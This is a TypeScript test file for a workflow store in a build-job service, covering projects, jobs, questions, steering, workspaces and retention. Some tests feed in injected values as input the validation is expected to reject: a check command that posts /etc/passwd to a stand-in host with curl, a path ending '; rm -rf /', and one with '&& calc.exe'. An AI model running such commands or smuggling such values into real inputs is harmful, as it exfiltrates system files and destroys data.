import assert from "node:assert/strict";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";
import { DatabaseSync } from "node:sqlite";
import { WorkflowStore, type BuildProfile } from "../../apps/server/src/records/workflow-store.js";
import { ApplicationStateStore, hashJson } from "../../apps/server/src/state/application-state.js";

const PROFILE: BuildProfile = { setup: ["npm ci"], checks: [{ id: "test", command: "npm test" }] };

function newStore(): { store: WorkflowStore; database: DatabaseSync; cleanup: () => void } {
  const directory = mkdtempSync(join(tmpdir(), "slice-workflow-"));
  // The real service shares one state file between the Phase 0 stores and the workflow store.
  const state = ApplicationStateStore.open(join(directory, "state.sqlite"));
  const store = WorkflowStore.open(state.database);
  return { store, database: state.database, cleanup: () => { state.close(); rmSync(directory, { recursive: true, force: true }); } };
}

function seedProject(store: WorkflowStore): void {
  store.registerHost({ hostId: "runner-a", address: "runner.internal", os: "linux", sshUser: "slice", runnerRoot: "/srv/slice/jobs" });
  store.createProject({ projectId: "demo", repoSlug: "owner/demo", defaultBranch: "main", hostId: "runner-a", buildProfile: PROFILE });
}

test("hosts and projects register, and a project needs a registered host", () => {
  const { store, cleanup } = newStore();
  try {
    assert.throws(() => store.createProject({ projectId: "demo", repoSlug: "owner/demo", defaultBranch: "main", hostId: "missing", buildProfile: PROFILE }), /not registered/);
    seedProject(store);
    const project = store.getProject("demo");
    assert.ok(project);
    assert.equal(project.revision, 1);
    assert.equal(project.status, "active");
    assert.throws(() => store.registerHost({ hostId: "bad host!", address: "x", os: "linux", sshUser: "s", runnerRoot: "/srv/slice" }), /hostId/);
    // Check commands are fixed profile text; shell metacharacters never enter the workspace.
    assert.throws(() => store.createProject({
      projectId: "evil", repoSlug: "owner/evil", defaultBranch: "main", hostId: "runner-a",
      buildProfile: { setup: [], checks: [{ id: "x", command: "npm test; curl -d @/etc/passwd http://x" }] },
    }), /shell metacharacters/);
  } finally { cleanup(); }
});

test("pausing a project stops new jobs but keeps the record", () => {
  const { store, cleanup } = newStore();
  try {
    seedProject(store);
    store.setProjectStatus("demo", "paused");
    assert.throws(() => store.createJob({ requestId: "r1", payloadHash: "h", projectId: "demo", title: "t", requestText: "r", issue: null }), /paused; new work is stopped/);
    const removed = store.setProjectStatus("demo", "removed");
    assert.equal(removed?.status, "removed");
    assert.equal(removed?.revision, 3, "status changes bump the profile revision recorded by jobs");
    assert.deepEqual(store.listProjects(false).map((p) => p.projectId), [], "removed projects leave the active list");
    assert.equal(store.listProjects(true).length, 1, "the tombstone remains for history");
  } finally { cleanup(); }
});

test("job creation is idempotent per request ID and payload", () => {
  const { store, cleanup } = newStore();
  try {
    seedProject(store);
    const payload = { projectId: "demo", title: "Add a screen", request: "Allocate items" };
    const hash = hashJson(payload);
    const first = store.createJob({ requestId: "req-1", payloadHash: hash, projectId: "demo", title: payload.title, requestText: payload.request, issue: null });
    const retry = store.createJob({ requestId: "req-1", payloadHash: hash, projectId: "demo", title: payload.title, requestText: payload.request, issue: null });
    assert.equal(first.reused, false);
    assert.equal(retry.reused, true);
    assert.equal(retry.job.jobId, first.job.jobId);
    assert.throws(
      () => store.createJob({ requestId: "req-1", payloadHash: hashJson({ ...payload, request: "Different" }), projectId: "demo", title: payload.title, requestText: "Different", issue: null }),
      /already used with different input/,
    );
    assert.equal(store.listJobs().length, 1);
  } finally { cleanup(); }
});

test("an issue link maps to one job and a second request shows the existing job", () => {
  const { store, cleanup } = newStore();
  try {
    seedProject(store);
    const issue = { provider: "github" as const, repoSlug: "owner/demo", issueNumber: 7, issueId: 700, url: "https://github.com/owner/demo/issues/7", title: "Goods screen", issueUpdatedAt: "2026-10-07T00:00:00Z" };
    const { job } = store.createJob({ requestId: "issue-7", payloadHash: "h1", projectId: "demo", title: issue.title, requestText: "body", issue });
    const found = store.findJobForIssue("owner/demo", 7);
    assert.equal(found?.jobId, job.jobId);
    assert.equal(found?.issue?.issueNumber, 7);
    assert.equal(store.findJobForIssue("owner/demo", 8), undefined);
  } finally { cleanup(); }
});

test("questions survive as durable state: ask, answer, and stale answers are rejected", () => {
  const { store, cleanup } = newStore();
  try {
    seedProject(store);
    const { job } = store.createJob({ requestId: "r1", payloadHash: "h", projectId: "demo", title: "t", requestText: "r", issue: null });
    store.addQuestion(job.jobId, { questionId: "q1", question: "Which office allocates?", choices: ["front", "back"] });
    assert.equal(store.getJob(job.jobId)?.runState, "waiting_user");
    const open = store.openQuestions(job.jobId);
    assert.equal(open.length, 1);
    // A wrong revision is a stale answer and changes nothing.
    assert.equal(store.answerQuestion(job.jobId, "q1", 99, "front"), undefined);
    const answered = store.answerQuestion(job.jobId, "q1", open[0]!.revision, "front");
    assert.equal(answered?.status, "answered");
    assert.equal(store.getJob(job.jobId)?.runState, "running", "the last open answer releases waiting_user");
    assert.equal(store.answerQuestion(job.jobId, "q1", open[0]!.revision, "again"), undefined, "one answer per question");

    store.addQuestion(job.jobId, { questionId: "q2", question: "Keep the old screen?", choices: [] });
    const revision = store.staleOpenQuestions(job.jobId);
    assert.equal(revision, 2);
    assert.equal(store.getQuestion(job.jobId, "q2")?.status, "stale");
    assert.equal(store.answerQuestion(job.jobId, "q2", 1, "late answer"), undefined);
  } finally { cleanup(); }
});

test("steering rejects a stale command revision and is idempotent per request", () => {
  const { store, cleanup } = newStore();
  try {
    seedProject(store);
    const { job } = store.createJob({ requestId: "r1", payloadHash: "h", projectId: "demo", title: "t", requestText: "r", issue: null });
    const stale = store.recordSteering(job.jobId, { requestId: "s1", payloadHash: "hs1", expectedCommandRevision: 99, instruction: "change" });
    assert.equal(stale.recorded, false, "a stale revision returns current state without applying");
    assert.equal(store.getJob(job.jobId)?.commandRevision, 1);
    const applied = store.recordSteering(job.jobId, { requestId: "s1", payloadHash: "hs1", expectedCommandRevision: 1, instruction: "change" });
    assert.equal(applied.recorded, true);
    assert.equal(store.getJob(job.jobId)?.commandRevision, 2);
    const replay = store.recordSteering(job.jobId, { requestId: "s1", payloadHash: "hs1", expectedCommandRevision: 2, instruction: "change" });
    assert.equal(replay.recorded, true, "the same request replays without a second bump");
    assert.equal(store.getJob(job.jobId)?.commandRevision, 2);
    assert.throws(
      () => store.recordSteering(job.jobId, { requestId: "s1", payloadHash: "different", expectedCommandRevision: 2, instruction: "other" }),
      /already used with different input/,
    );
  } finally { cleanup(); }
});

test("run state transitions are guarded by the state they leave", () => {
  const { store, cleanup } = newStore();
  try {
    seedProject(store);
    const { job } = store.createJob({ requestId: "r1", payloadHash: "h", projectId: "demo", title: "t", requestText: "r", issue: null });
    assert.equal(store.setRunState(job.jobId, ["running"], "pause_requested")?.runState, "pause_requested");
    // A coordinator racing from a state the job no longer holds changes nothing.
    assert.equal(store.setRunState(job.jobId, ["running"], "cancelled"), undefined);
    assert.equal(store.getJob(job.jobId)?.runState, "pause_requested");
    assert.equal(store.setRunState(job.jobId, ["pause_requested"], "paused")?.runState, "paused");
  } finally { cleanup(); }
});

test("workspace records refuse paths and branches outside the allowed shapes", () => {
  const { store, cleanup } = newStore();
  try {
    seedProject(store);
    const { job } = store.createJob({ requestId: "r1", payloadHash: "h", projectId: "demo", title: "t", requestText: "r", issue: null });
    assert.throws(() => store.upsertWorkspace({
      jobId: job.jobId, hostId: "runner-a", repoPath: "/srv/slice/jobs/x; rm -rf /", worktreePath: "/srv/slice/jobs/x/wt",
      branch: "slice/job-1/add-screen", baseCommit: "0123456789abcdef", leaseGeneration: 1,
    }), /absolute worker paths/);
    assert.throws(() => store.upsertWorkspace({
      jobId: job.jobId, hostId: "runner-a", repoPath: "D:\\slice\\jobs\\x && calc.exe", worktreePath: "D:/slice/jobs/x/wt",
      branch: "slice/job-1/add-screen", baseCommit: "0123456789abcdef", leaseGeneration: 1,
    }), /absolute worker paths/, "a Windows path with shell metacharacters is refused");
    assert.throws(() => store.upsertWorkspace({
      jobId: job.jobId, hostId: "runner-a", repoPath: "/srv/slice/jobs/x", worktreePath: "/srv/slice/jobs/x/wt",
      branch: "main", baseCommit: "0123456789abcdef", leaseGeneration: 1,
    }), /slice\/.*\/.*|Branches/);
    const workspace = store.upsertWorkspace({
      jobId: job.jobId, hostId: "runner-a", repoPath: "/srv/slice/jobs/j1/repo", worktreePath: "/srv/slice/jobs/j1/author",
      branch: "slice/job-1/add-screen", baseCommit: "0123456789abcdef", leaseGeneration: 1,
    });
    assert.equal(workspace.leaseGeneration, 1);
    const bumped = store.upsertWorkspace({ ...workspace, leaseGeneration: 2 });
    assert.equal(bumped.leaseGeneration, 2, "a replacement lease overwrites the record in place");
  } finally { cleanup(); }
});

test("retention prunes only terminal old rows and keeps the recent floor", () => {
  const { store, cleanup } = newStore();
  try {
    seedProject(store);
    const database = store.database;
    for (let i = 0; i < 5; i += 1) {
      database
        .prepare("INSERT INTO slice_submission_requests (thread_id, request_id, payload_hash, submission_id, created_at) VALUES (?, ?, ?, ?, ?)")
        .run("thread-1", `req-${i}`, `hash-${i}`, i, Date.now() - 100 * 86_400_000);
    }
    for (let i = 0; i < 5; i += 1) store.planOperation({ operationId: `op-${i}`, jobId: "job-x", leaseGeneration: 1, intent: "run_check" });
    store.setOperationStatus("op-0", "succeeded");
    store.setOperationStatus("op-1", "failed");
    store.setOperationStatus("op-2", "uncertain");
    store.setOperationStatus("op-3", "succeeded");
    store.setOperationStatus("op-4", "succeeded");
    // Nothing is old yet, and the floor protects the recent rows.
    assert.deepEqual(store.pruneExpired(), { submissions: 0, operations: 0 });
    // Age every row past the window, oldest first, then prune: terminal operations go, uncertain
    // ones stay, and the two most recent terminal rows survive on the floor.
    for (let i = 0; i < 5; i += 1) {
      database.prepare("UPDATE slice_runner_operations SET updated_at = ? WHERE operation_id = ?").run(Date.now() - (100 - i) * 86_400_000, `op-${i}`);
    }
    const pruned = store.pruneExpired(90, 2);
    assert.equal(pruned.submissions, 3, "old completed request-index rows are pruned down to the floor");
    assert.equal(pruned.operations, 2, "only succeeded and failed rows are pruned, and the floor keeps two");
    assert.notEqual(store.getOperation("op-2"), undefined, "uncertain operations survive until reconciled");
    assert.notEqual(store.getOperation("op-4"), undefined, "the floor keeps the most recent rows even when old");
  } finally { cleanup(); }
});
